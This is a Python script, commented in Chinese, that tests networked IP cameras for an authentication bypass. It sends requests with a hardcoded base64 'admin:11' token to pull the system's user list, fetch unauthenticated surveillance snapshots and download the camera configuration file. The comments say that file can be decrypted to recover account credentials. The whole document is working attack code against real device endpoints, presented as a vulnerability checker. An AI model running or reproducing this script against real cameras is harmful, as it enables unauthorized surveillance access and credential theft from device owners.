import requests

# 查看系统所有存在用户列表  
url1 = "http://<host>/Security/users?auth=YWRtaW46MTEKYWRtaW46MTEK"

response1 = requests.get(url1)

if "admin" in response1.text:
    print("[+] First URL is vulnerable to authentication bypass!")
else:
    print("[-] First URL is not vulnerable.")

# 获取系统监控快照，不需要进行身份验证。
url2 = "http://<host>/onvif-http/snapshot?auth=YWRtaW46MTEK"

response2 = requests.get(url2)

if response2.status_code == 200 and response2.headers["content-type"].startswith("image"):
    print("[+] Second URL is vulnerable to unauthenticated snapshot access!")
else:
    print("[-] Second URL is not vulnerable.")

# 下载摄像机配置文件，通过脚本解密配置文件获得账密信息。
url3 = "http://<host>/System/configurationFile?auth=YWRtaW46MTEK"

response3 = requests.get(url3)

if "system.xml" in response3.text:
    print("[+] Third URL is vulnerable to authentication bypass and configuration file disclosure!")
else:
    print("[-] Third URL is not vulnerable.")
